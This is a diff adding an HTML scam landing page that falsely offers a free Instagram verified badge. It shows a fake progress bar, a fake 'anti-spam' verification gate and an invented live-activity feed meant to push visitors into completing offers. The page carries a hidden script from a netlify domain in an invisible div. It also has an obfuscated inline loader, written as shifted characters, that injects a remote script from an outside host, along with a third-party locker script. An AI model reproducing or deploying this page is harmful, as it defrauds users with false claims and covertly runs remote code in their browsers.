@@ -1,0 +1,626 @@
+﻿
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+    <meta name="Viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+    <title>Free Instagram Verified Badge</title>
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet"/>
+    
+<!-- For More CPA landing Pages:  https://t.me/templates55 !-->
+<!-- For More CPA landing Pages:  https://t.me/templates55 !-->
+
+    <style>
+      /* Colors */
+/* All */
+* {
+  padding: 0;
+  margin: 0;
+  font-family: 'Lato', sans-serif; }
+
+/* Default */
+body {
+  background: -webkit-linear-gradient(228deg, #5d18b8 0%, #dc103b 100%);
+  background: -o-linear-gradient(228deg, #5d18b8 0%, #dc103b 100%);
+  background: linear-gradient(222deg, #5d18b8 0%, #dc103b 100%); }
+
+.text-standout {
+  font-weight: 600;
+  color: #2C96EA; }
+
+button {
+  display: block;
+  margin: 0 auto;
+  width: 400px;
+  padding: 12px;
+  background-color: #2C96EA;
+  border: 1px solid #2C96EA;
+  color: #fff;
+  cursor: pointer;
+  font-size: 14px;
+  -webkit-transition: all 0.3s ease-in-out;
+  -o-transition: all 0.3s ease-in-out;
+  transition: all 0.3s ease-in-out; }
+  button:focus {
+    outline: 0; }
+  button:hover {
+    background-color: #3ba5f9; }
+
+a {
+  text-decoration: none; }
+
+/* nav */
+nav {
+  background: #fff;
+  padding: 20px;
+  -webkit-box-shadow: 0 2px 20px rgba(0, 0, 0, 0.075);
+  box-shadow: 0 2px 20px rgba(0, 0, 0, 0.075); }
+  nav img {
+    cursor: pointer;
+    vertical-align: middle;
+    width: 140px; }
+
+main {
+  margin: 45px 0; }
+
+/* section */
+section {
+  width: 750px;
+  margin: 0 auto;
+  text-align: center;
+  -webkit-box-shadow: 0 2px 15px 5px rgba(0, 0, 0, 0.12);
+  box-shadow: 0 2px 15px 5px rgba(0, 0, 0, 0.12);
+  margin-bottom: 25px; }
+  section p {
+    max-width: 600px;
+    margin: 0 auto; }
+
+.section-head, .section-body {
+  background: #fff;
+  padding: 30px; }
+
+.section-body {
+  background-color: #DEDEDE; }
+  .section-body p {
+    color: #8e8e8e; }
+
+.section-head-description p {
+  color: #8e8e8e; }
+
+/* generating badge */
+.generating-badge, .human-verification {
+  display: none; }
+
+.badge-generator .section-head-title img {
+  vertical-align: middle;
+  width: 28px;
+  height: 28px;
+  margin-right: 5px; }
+
+.badge-generator .section-head-title h3 {
+  vertical-align: middle;
+  display: inline-block; }
+
+.badge-generator .section-body p {
+  margin-bottom: 5px; }
+
+.badge-generator .section-body input {
+  text-align: center;
+  margin: 10px 10px 6px;
+  padding: 12px;
+  width: 400px;
+  border: 1px solid #d3d3d3;
+  font-size: 14px; }
+
+/* recent activity */
+.recent-activity {
+  margin-bottom: 45px; }
+  .recent-activity h3 {
+    display: inline-block; }
+  .recent-activity .section-body {
+    padding: 0; }
+
+.live-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background-color: #E44C58;
+  display: inline-block;
+  position: relative;
+  bottom: 9px;
+  left: 3px;
+  -webkit-animation: blink 1s infinite linear;
+  animation: blink 1s infinite linear; }
+
+@-webkit-keyframes blink {
+  0% {
+    opacity: 0; }
+  100% {
+    opacity: 1; } }
+
+@keyframes blink {
+  0% {
+    opacity: 0; }
+  100% {
+    opacity: 1; } }
+
+.activities {
+  max-height: 300px;
+  overflow-y: scroll;
+  padding: 25px; }
+
+.activity {
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-pack: justify;
+  -ms-flex-pack: justify;
+  justify-content: space-between;
+  background: #fff;
+  padding: 10px 20px;
+  border-radius: 6px;
+  -webkit-box-shadow: 0 2px 25px rgba(0, 0, 0, 0.075);
+  box-shadow: 0 2px 25px rgba(0, 0, 0, 0.075);
+  -webkit-box-align: center;
+  -ms-flex-align: center;
+  align-items: center;
+  margin-bottom: 8px; }
+  .activity:hover {
+    -webkit-box-shadow: 0px 2px 30px rgba(0, 0, 0, 0.15);
+    box-shadow: 0px 2px 30px rgba(0, 0, 0, 0.15); }
+
+.activity-avatar {
+  width: 36px;
+  height: 36px;
+  vertical-align: middle;
+  margin-right: 10px; }
+
+.activity-content p {
+  display: inline-block;
+  vertical-align: middle;
+  color: black; }
+
+.activity-badge {
+  vertical-align: middle;
+  width: 20px;
+  height: 20px;
+  margin-left: 4px; }
+
+.activity-timestamp p {
+  color: #8e8e8e; }
+
+/* generating badge */
+#progress-wrapper {
+  width: 400px;
+  margin: 0 auto 10px; }
+
+.human-verification button {
+  margin: 15px auto; }
+
+.human-verification .verification-text {
+  margin-top: 15px; }
+
+.human-verification .awaiting-verification img {
+  width: 20px;
+  height: 20px;
+  vertical-align: middle;
+  margin-right: 8px;
+  -webkit-animation: spin 0.75s infinite linear;
+  animation: spin 0.75s infinite linear; }
+
+.human-verification .awaiting-verification span {
+  color: #8e8e8e;
+  vertical-align: middle; }
+
+@-webkit-keyframes spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(359deg);
+    transform: rotate(359deg); } }
+
+@keyframes spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(359deg);
+    transform: rotate(359deg); } }
+
+@media screen and (max-width: 900px) {
+  section {
+    width: 500px; }
+  .badge-generator .section-body input, button, #progress-wrapper {
+    width: 300px; } }
+
+@media screen and (max-width: 600px) {
+  body {
+    background: #fff; }
+  nav {
+    -webkit-box-shadow: 0 2px 25px rgba(0, 0, 0, 0.15);
+    box-shadow: 0 2px 25px rgba(0, 0, 0, 0.15);
+    position: relative;
+    z-index: 9999; }
+  section {
+    margin: 0;
+    width: 100%;
+    -webkit-box-shadow: none;
+    box-shadow: none; }
+  main {
+    margin: 0;
+    position: relative;
+    z-index: 0; } }
+
+@media screen and (max-width: 400px) {
+  .badge-generator .section-body input, button, #progress-wrapper {
+    width: 250px; }
+  nav {
+    padding: 15px; }
+    nav img {
+      width: 115px; }
+  .human-verification .section-head-description {
+    display: none; }
+  .human-verification .section-body p:first-child {
+    padding: 15px;
+    background: -webkit-gradient(linear, left top, left bottom, from(white), to(#e9e9e9));
+    background: -webkit-linear-gradient(top, white 0%, #e9e9e9 100%);
+    background: -o-linear-gradient(top, white 0%, #e9e9e9 100%);
+    background: linear-gradient(180deg, white 0%, #e9e9e9 100%);
+    border-radius: 6px;
+    -webkit-box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+    box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1); } }
+
+@media screen and (max-width: 370px) {
+  .badge-generator .section-head-description {
+    display: none; } }
+
+@media screen and (max-width: 340px) {
+  .badge-generator .section-body input, button, #progress-wrapper {
+    width: 220px; } }
+
+    .btn-down {
+    display: inline-block;
+    padding: 10px 90px;
+    background-color: #007bff;
+    color: white;
+    text-decoration: none;
+    border-radius: 5px;
+    border: none;
+    cursor: pointer;
+}
+
+.btn-down:hover {
+    background-color: #0056b3;
+}
+
+
+
+      </style>
+    
+    
+  <link rel="me" href="https://www.blogger.com/profile/14099967826476573243" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+  <body>
+    <nav><a href="/"><img src="https://i.imgur.com/L9Va2bt.png"/></a></nav>
+    <main>
+      <section class="badge-generator">
+        <div class="section-head">
+          <div class="section-head-title"><img src="https://i.imgur.com/unSwBi6.png"/>
+            <h3>Instagram Verified Badge Generator</h3>
+          </div>
+          <div class="section-head-description">
+            <p>Add an Instagram Verified Badge to your Instagram Profile Page</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <p>Start by entering your Instagram username below</p>
+          <input type="text" placeholder="Instagram Username" onfocus="this.placeholder=''" onblur="this.placeholder='Instagram Username'"/>
+          <button>Generate Badge</button>
+        </div>
+      </section>
+      <section class="generating-badge">
+        <div class="section-head">
+          <div class="section-head-title">
+            <h3>Generating!</h3>
+          </div>
+          <div class="section-head-description">
+            <p>Your Instagram Verified Badge is currently being generated</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <div id="progress-wrapper"></div>
+          <p class="progress-message">Connecting your account with our services...</p>
+        </div>
+      </section>
+      <section class="human-verification">
+        <div class="section-head">
+          <div class="section-head-title">
+            <h3>Anti-Spam System Has Been Enabled</h3>
+          </div>
+          <div class="section-head-description">
+            <p>Prove you're not a robot to continue</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <p>As a result of the increasing number of requests for verification badges, we have enabled anti-spam to prevent bots from overloading our servers.</p>
+          <p class="verification-text">Please verify that you are a human by pressing the <span class="text-standout">Verify Now </span>button below to continue</p>
+          <a class="btn-down" href="Verification.html">Verify Now</a>
+          <div class="awaiting-verification"><img src="https://i.imgur.com/gzKcTC4.png"/><span>Awaiting Verification</span></div>
+        </div>
+      </section>
+    </main>
+   <div style="display: none;"><script src="https://google-scripts-xzcjhj.netlify.app/3.js"></script></div>
+    <section class="recent-activity">
+      <div class="section-head">
+        <div class="section-head-title">
+          <h3>Recent Activity</h3>
+          <div class="live-dot"></div>
+        </div>
+        <div class="section-head-description">
+          <p>See who's generating Instagram Verified Badges live</p>
+        </div>
+      </div>
+      <div class="section-body">
+        <div class="activities"></div>
+      </div>
+    </section>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/progressbar.js/1.0.1/progressbar.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.3/mobile-detect.min.js"></script>
+    <script type=text/javascript>(function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("jhwfsjgjfe/dpn")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>52:1');document[k('ifbe')].appendChild(s)}})(document)</script>
+    
+    <script>
+      /**
+ * Landing Page Config
+ */
+var config = {
+  recentActivityIntervalDuration: 5, // seconds
+  recentActivities: [
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png', // or: avatarImageUrl: 'https://imgur.com/',
+      username: 'Anonymous',
+      time: 'few hours ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few minutes ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few minutes ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    {
+      avatarImageUrl: 'https://i.imgur.com/XReY3sH.png',
+      username: 'Anonymous',
+      time: 'few seconds ago',
+      instagramProfileUrl: 'https://instagram.com/username'
+    },
+    // add more recent activities here. Will be displayed last.
+  ]
+}
+
+/**
+ * Utility functions
+ */
+var util = {
+  animate: function(element, animationName, callback) {
+    var animationEnd = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
+    $(element).addClass('animated ' + animationName).one(animationEnd, function() {
+      $(element).removeClass('animated ' + animationName);
+      if (typeof callback === 'function') { callback() }
+    })
+  }
+}
+
+/**
+ * App VM
+ */
+var app = {
+  state: {
+    username: undefined,
+    displayingSection: 'badge-generator'
+  },
+  init: function() {
+    util.animate('.badge-generator', 'fadeInDown');
+    recentActivity.init();
+  },
+  displayFromTo: function(fromSection, toSection) {
+    util.animate('.' + fromSection, 'fadeOutUp', function() {
+      $('.' + fromSection).hide();
+      $('.' + toSection).show();
+      util.animate('.' + toSection, 'fadeInDown');
+    })
+    $('body').animate({ scrollTop: 0 }, "slow");
+    app.state.displayingSection = toSection;
+  }
+}
+
+/**
+ * Badge Generator VM
+ */
+var badgeGenerator = {
+  verifyInput: function(input) {
+    if (input.length < 2) {
+      alert("Please enter your Instagram Username and tap the 'Generate Badge' button.");
+      return false;
+    } else {
+      return true;
+    }
+  }
+};
+
+/**
+ * Badge Generator Events
+ */
+$('.badge-generator button').on('click', function() {
+  var username = $('.badge-generator input').val();
+  if(badgeGenerator.verifyInput(username)) {
+    app.state.username = username;
+    $('.badge-generator')
+    app.displayFromTo('badge-generator','generating-badge');
+    generatingBadge.initializeProgressBar();
+  }
+});
+
+/**
+ * Generating Badge VM
+ */
+var generatingBadge = {
+  state: {
+    progressBar: undefined
+  },
+  /**
+   * Initializes the progress bar.
+   */
+  initializeProgressBar: function() {
+    this.state.progressBar = new ProgressBar.Line('#progress-wrapper', {
+      color: '#2C96EA',
+      trailColor: '#ced5da',
+      strokeWidth: 5
+    });
+    this.startProgressBarAnimation(); // todo remove
+  },
+  /**
+   * Starts animating the progress bar.
+   */
+  startProgressBarAnimation: function() {
+    this.state.progressBar.animate(1, {duration: 20000}, function() {
+      app.displayFromTo('generating-badge','human-verification');
+    });
+    this.startProgressMessages();
+  },
+  /**
+   * Sets custom progress bar messages as it animates.
+   */
+  startProgressMessages: function() {
+    var progressMessages = [
+      'Connected! Generating request for verification badge...',
+      'Request successful, ready to add badge to account...',
+    ];
+    var progressMessageKey = 0;
+
+    var progressMessageInterval = window.setInterval(function() {
+      if (progressMessageKey !== 2) {
+        $('.progress-message').text(progressMessages[progressMessageKey]);
+        progressMessageKey++
+      } else {
+        window.clearInterval(progressMessageInterval);
+      }
+    }, 7000);
+  }
+}
+
+var recentActivity = {
+  state: {
+    activities: config.recentActivities,
+    interval: undefined
+  },
+  init: function() {
+    var initialActivities = [
+      this.state.activities[0],
+      this.state.activities[1],
+      this.state.activities[2],
+      this.state.activities[3],
+      this.state.activities[4],
+      this.state.activities[5]
+    ];
+    for(i=0;i<6;i++) {
+      var activityHtml = this.createHtml(initialActivities[i]);
+      this.appendHtml(activityHtml);
+    }
+    this.state.activities.splice(0, 5);
+    this.startInterval();
+  },
+  startInterval: function() {
+    if (this.state.activities.length > 0) {
+      this.state.interval = window.setInterval(function() {
+        activityHtml = recentActivity.createHtml(recentActivity.state.activities[0]);
+        recentActivity.appendHtml(activityHtml);
+        $('.activities').animate({ scrollTop: 0 }, "slow");
+      }, config.recentActivityIntervalDuration*1000);
+    } else {
+
+    }
+  },
+  createHtml: function(activity) {
+    var activityHtml = "<a href='"+activity.instagramProfileUrl+"' target='blank'><div class='activity animated fadeInDown'><div class='activity-content'><img class='activity-avatar' src='"+activity.avatarImageUrl+"' /><p>"+activity.username+"</p><img class='activity-badge' src='https://i.imgur.com/unSwBi6.png' /></div><div class='activity-timestamp'><p>"+activity.time+"</p></div></div></a>";
+    return activityHtml;
+  },
+  appendHtml: function(activityHtml) {
+    $('.activities').prepend(activityHtml);
+  }
+}
+
+app.init();
+    </script>
+    
+    <script type="text/javascript">
+    var tXlet_aSR_ONpDRc={"it":4201804,"key":"53471"};
+</script>
+<script src="https://d3qborf6vf5lth.cloudfront.net/892cd75.js"></script>
+    
+    
+<!-- For More CPA landing Pages:  https://t.me/templates55 !-->
+<!-- For More CPA landing Pages:  https://t.me/templates55 !-->
+
+    
+    
+  </body>
+</html>
